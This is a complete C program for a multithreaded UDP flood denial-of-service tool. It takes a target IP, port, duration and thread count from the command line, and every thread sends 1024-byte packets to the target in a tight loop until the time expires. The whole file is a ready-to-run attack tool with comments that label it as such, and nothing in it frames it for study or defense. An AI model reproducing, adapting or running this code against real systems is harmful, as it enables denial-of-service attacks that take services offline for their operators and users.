#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>

// Structure to hold attack parameters
typedef struct {
    char *target_ip;
    int target_port;
    int duration;
} attack_params;

// Function to handle the UDP flood attack
void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;

    int sock;
    struct sockaddr_in server_addr;
    char *message;
    int msg_size = 1024; // Adjust the size based on your need

    // Create a raw UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Set up the server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    // Create a random message
    message = (char *)malloc(msg_size);
    memset(message, 'A', msg_size);

    // Attack loop: Send UDP packets for the specified duration
    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time) {
        sendto(sock, message, msg_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    close(sock);
    free(message);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s [IP] [PORT] [TIME] [THREAD]\n", argv[0]);
        return -1;
    }

    // Parse arguments
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);

    // Array of thread IDs
    pthread_t threads[thread_count];
    attack_params params = {target_ip, target_port, duration};

    // Create and run threads
    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, udp_flood, &params);
    }

    // Wait for all threads to finish
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack finished.\n");
    return 0;
}
